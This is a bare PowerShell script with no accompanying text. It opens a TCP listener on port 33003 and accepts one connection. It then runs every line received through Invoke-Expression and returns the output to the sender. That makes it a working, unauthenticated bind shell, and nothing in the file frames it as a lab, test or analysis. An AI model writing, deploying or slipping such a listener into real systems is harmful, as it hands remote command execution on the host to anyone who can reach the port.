$listener = New-Object System.Net.Sockets.TcpListener(33003);
$listener.Start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
$reader = New-Object System.IO.StreamReader($stream);
$writer = New-Object System.IO.StreamWriter($stream);
$writer.AutoFlush = $true;

while(!$reader.EndOfStream){
    $command = $reader.ReadLine();
    $output = Invoke-Expression $command 2>&1 | Out-String;
    $writer.WriteLine($output);
}
$client.Close();
$listener.Stop();
